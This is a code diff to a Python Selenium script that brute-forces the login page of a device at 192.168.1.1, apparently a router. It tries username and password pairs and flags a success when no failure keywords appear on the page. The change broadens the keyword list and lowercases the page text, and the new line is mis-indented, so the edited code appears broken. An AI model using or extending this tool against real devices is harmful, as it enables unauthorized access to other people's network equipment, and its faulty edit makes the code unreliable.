@@ -8,7 +8,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
 URL = "http://192.168.1.1"
-EXPRESSIONS = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade"}
+EXPRESSIONS = {b"failed", b"error", b"incorrect", b"failure", b"try", b"again", b"invalid", b"upgrade", b"outdated", b"browser"}
 
 def brute_with_selenium(username, password):
     options = Options()
@@ -27,7 +27,9 @@ def brute_with_selenium(username, password):
         password_input.send_keys(password)
         password_input.submit()
 
-        if not any(item in driver.page_source.encode('utf-8') for item in EXPRESSIONS):
+    driver_lower_content = driver.page_source.lower().encode('utf-8')
+
+        if not any(item in driver_lower_content for item in EXPRESSIONS):
             print("\nBrute Forcing...")
             print("[+] Username: ", username)
             print("[+] Password: ", password)
